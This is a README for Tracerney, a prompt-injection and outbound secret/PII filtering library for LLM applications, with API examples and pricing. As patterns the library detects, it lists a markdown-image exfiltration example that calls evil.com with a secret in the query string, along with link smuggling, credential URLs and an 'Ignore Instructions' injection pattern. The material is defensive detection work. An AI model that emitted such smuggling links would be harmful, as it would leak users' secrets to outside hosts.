# Tracerney

Lightweight prompt injection detection and outbound PII/secret filtering for LLM applications. Runs 100% locally with zero data leaving your server.

> 🚀 **Explore the full platform at [tracerney.com](https://www.tracerney.com)** — includes dashboard, analytics, API management, and team collaboration tools.

## Install

```bash
npm install @sandrobuilds/tracerney
```

---

## Layer 1: The Deterministic Filter

A high-speed, synchronous sensor that scans every LLM **response** before it reaches your user. Target latency: **<5ms**. No LLM needed — pure regex.

The SDK never decides for you. It labels every finding and hands you the keys.

### The `validate()` API

```typescript
import { Tracerney } from '@sandrobuilds/tracerney';

const tracerney = new Tracerney();

const trace = tracerney.validate(agentOutput);

if (trace.isSuspicious) {
  console.log(`[${trace.label}]: ${trace.reason}`);

  // Option A: Hard block
  if (trace.label === 'SUSPICIOUS_EGRESS') {
    throw new Error('Security Policy Violation');
  }

  // Option B: Surgical scrub — return pre-computed redacted version
  return trace.redactedContent;
}
```

### The Suspicious Manifest

Every finding is labeled so you can route your own reaction:

| Trigger | Label | `redactedContent` token | Recommended action |
|---|---|---|---|
| Email / Phone | `SUSPICIOUS_PII` | `[SUSPICIOUS_PII:EMAIL]` | Usually Redact |
| API Keys / SSH / CC / SSN | `SUSPICIOUS_SECRET` | `[SUSPICIOUS_SECRET:ANTHROPIC_API_KEY]` | Usually Block |
| External URL smuggling | `SUSPICIOUS_EGRESS` | `[SUSPICIOUS_EGRESS:MARKDOWN_IMAGE_SMUGGLING]` | Always Block |
| Zero-width / BiDi / Base64 | `SUSPICIOUS_ENCODING` | `[SUSPICIOUS_ENCODING:BIDI_OVERRIDE]` | Audit / Block |

### `SuspiciousTrace` object

```typescript
const trace = tracerney.validate(agentOutput);

trace.isSuspicious      // boolean — true if any pattern matched
trace.label             // 'SUSPICIOUS_PII' | 'SUSPICIOUS_SECRET' | 'SUSPICIOUS_EGRESS' | 'SUSPICIOUS_ENCODING' | null
trace.reason            // "Detected 2 finding(s): Email Address, AWS Access Key ID"
trace.redactedContent   // pre-scrubbed version of the input — use it or throw, your call
trace.findings          // full per-pattern breakdown for logging/telemetry
```

### What Layer 1 detects

**`SUSPICIOUS_PII`** — Accidental personal data exposure
- Email addresses
- US phone numbers

**`SUSPICIOUS_SECRET`** — High-value credential leaks
- Anthropic, OpenAI, Stripe, GitHub, AWS, Google, Slack, SendGrid, Twilio API keys
- SSH / PEM private key blocks
- Credit card numbers (Visa, Mastercard, Amex, Discover)
- US Social Security Numbers

**`SUSPICIOUS_EGRESS`** — Active data exfiltration attempts
- Markdown image tags with URL query params: `![x](https://evil.com/log.png?config=secret)`
- Markdown links smuggling data via query params
- Credential-embedded URLs: `https://user:password@hostname`
- Base64 payloads in URL parameters

**`SUSPICIOUS_ENCODING`** — Obfuscation and hidden data
- Zero-width characters (`\u200B`, `\u200C`, `\uFEFF`, etc.)
- Unicode bidirectional override characters (BiDi attacks)
- Standalone base64 blobs (≥120 chars) outside of URLs

### Developer decision guide

```typescript
const trace = tracerney.validate(agentOutput);

if (!trace.isSuspicious) {
  return agentOutput; // clean
}

switch (trace.label) {

  case 'SUSPICIOUS_PII':
    // Low risk — agent is being too "talkative"
    // Redact and continue; don't break the user's flow
    return trace.redactedContent;

  case 'SUSPICIOUS_SECRET':
    // High risk — agent leaked a credential
    // Redact before sending, fire an alert
    myAlerts.fire({ label: trace.label, reason: trace.reason });
    return trace.redactedContent;

  case 'SUSPICIOUS_EGRESS':
    // Critical — agent is trying to exfiltrate data
    // Kill the process. The caller gets nothing.
    throw new SecurityError('Egress attack detected');

  case 'SUSPICIOUS_ENCODING':
    // Critical — hidden/obfuscated payload
    // Audit and block; send for review
    myAlerts.fire({ label: trace.label, reason: trace.reason });
    throw new SecurityError('Encoding attack detected');
}
```

---

## Layer 1 + LLM Pipeline: `wrap()`

If you want automatic protection wired into your LLM call, use `wrap()`. It runs Layer 1 on the response before returning it to you, and applies the same label-based routing:

- `SUSPICIOUS_EGRESS` → throws `ShieldBlockError` (caller gets nothing)
- `SUSPICIOUS_SECRET` / `SUSPICIOUS_ENCODING` → emits a `PII_LEAK` telemetry event, returns scrubbed response
- `SUSPICIOUS_PII` → returns scrubbed response silently

```typescript
const response = await tracerney.wrap(
  () => openai.chat.completions.create({ model: 'gpt-4o', messages }),
  { prompt: userInput } // optional: also scan the inbound prompt
);
// response.choices[0].message.content is already scrubbed
```

---

## Layer 2: LLM Sentinel

Layer 2 adds AI-powered verification for novel attack patterns not covered by regex. It runs after Layer 1 marks a prompt suspicious, using a hosted LLM to confirm or clear the threat.

**Layer 1 (Free)** | **Layer 2 (Pro — $9/month)**
---|---
Local regex, <5ms | Server-side LLM analysis
258 attack patterns | Context-aware threat detection
No network calls | Zero prompt storage
Always on | Activates only on Layer 1 hits

### Enable Layer 2

```typescript
const tracerney = new Tracerney({
  apiKey: process.env.TRACERNEY_API_KEY,
  sentinelEnabled: true,
});
```

### Layer 2 response format

```json
// Safe
{ "action": "ALLOW", "confidence": 0.15, "class": "safe_content", "fingerprint": "a3f7k2" }

// Blocked
{ "action": "BLOCK", "confidence": 0.99, "class": "jailbreak_semantic_pattern", "fingerprint": "c1p5n3" }
```

---

## Inbound prompt scanning: `scanPrompt()`

```typescript
const result = await tracerney.scanPrompt(userInput);

if (result.suspicious) {
  console.log('Suspicious:', result.patternName, result.severity);
}
```

```typescript
result.suspicious     // boolean
result.patternName    // e.g. "Ignore Instructions"
result.severity       // "CRITICAL" | "HIGH" | "MEDIUM" | "LOW"
result.blocked        // true only if Layer 2 confirmed the attack
```

---

## Pricing

- **Free:** 50 scans/month — Layer 1 pattern detection
- **Pro ($9/month):** 2,500 scans/month — Layer 1 + Layer 2 LLM Sentinel

**[Start free or upgrade at tracerney.com](https://www.tracerney.com/docs)**

---

## License

MIT
